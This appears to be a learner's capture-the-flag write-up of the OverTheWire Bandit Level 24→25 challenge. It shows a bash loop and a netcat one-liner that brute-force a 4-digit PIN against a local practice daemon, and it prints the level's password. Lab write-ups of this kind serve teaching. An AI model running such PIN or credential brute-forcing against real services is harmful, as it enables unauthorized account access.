# Bandit Level 24 → Level 25

## Level Goal

A daemon is listening on port `30002` and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit PIN code. There is no way to retrieve the PIN code except by going through all 10,000 combinations (0000–9999), called brute-forcing.

---

## Understanding the Target Service

The service on port `30002` expects input in a single line containing the current password and a PIN guess separated by a space:

```text
<bandit24_password> <4-digit-pin>
```

Example request:
```text
VA2BxB8ReAAnL2x6Jn33n3554211 0000
```

If the PIN is incorrect, the server replies:
```text
Wrong! Please enter the correct PIN.
```

When the correct PIN is supplied, the server returns the password for Level 25.

---

## Where I Got Stuck & Initial Challenges

### 1. Conceptual Uncertainty
I initially wasn't familiar with how to perform a brute-force attack in Linux. I knew the basic usage of `nc` (netcat), but wasn't sure how to handle 10,000 requests without opening 10,000 separate network connections.

### 2. Syntax & Shell Errors
When trying to save the script using a `cat << 'EOF'` heredoc block, I initially typed the execution piping (`| nc localhost 30002 ...`) inside the creation commands and hit `Ctrl+C`, which aborted the file creation. I also initially wondered if I needed to run a listening netcat instance (`nc -l`) in another terminal, before realizing the target service was already running as a daemon.

---

## The Solution Strategy

The service stays open over a standard input stream. Rather than establishing individual network connections for every guess, we can generate all 10,000 combinations (`0000` to `9999`) in a local loop and pipe them into a single `nc` connection.

To clean up the output and avoid scrolling through thousands of "Wrong!" messages, we pipe the responses into `grep -v "Wrong"`.

---

## Execution

### Method 1: Creating an Executable Script

1. Navigate to a temporary working directory:
   ```bash
   cd /tmp/tmp.EwdvCJqzrG
   ```

2. Create the script file:
   ```bash
   cat << 'EOF' > get_pass.sh
   #!/bin/bash
   PASS="VA2BxB8ReAAnL2x6Jn33n3554211"

   for pin in $(seq -w 0000 9999); do
       echo "$PASS $pin"
   done
   EOF
   ```

3. Make the script executable and run it, piping into `nc`:
   ```bash
   chmod +x get_pass.sh
   ./get_pass.sh | nc localhost 30002 | grep -v "Wrong"
   ```

### Method 2: Shell One-Liner

Alternatively, the loop can be piped directly into `nc` without saving a script file:

```bash
for pin in $(seq -w 0000 9999); do echo "VA2BxB8ReAAnL2x6Jn33n3554211 $pin"; done | nc localhost 30002 | grep -v "Wrong"
```

---

## Output

```text
Correct!
The password of user bandit25 is [REDACTED_BANDIT25_PASSWORD]
```

---

## Commands Used

```bash
seq -w 0000 9999

nc localhost 30002

grep -v "Wrong"
```

---

## What I Learned

### 1. Network Stream Brute-Forcing
Piping standard output into a netcat client allows multiple inputs to be processed over a single connection stream, significantly speeding up brute-force attempts compared to opening repetitive connections.

### 2. `seq -w` for Padded Sequences
The `-w` flag in `seq` ensures equal width by padding numbers with leading zeros (e.g., `0000` through `9999`), which is essential when testing formatted PINs.

### 3. Inverted Matching with `grep -v`
Using `grep -v` filters out predictable failure responses, ensuring only success messages or non-standard responses are displayed.

---

## Key Takeaway

> **When interacting with network services over stdin, stream all inputs over a single pipe rather than recreating network connections.**

Data pipeline:

```text
seq -w 0000 9999
        ↓
"PASSWORD PIN" (10,000 lines)
        ↓
nc localhost 30002 (Single Stream)
        ↓
grep -v "Wrong"
        ↓
Level 25 Password
```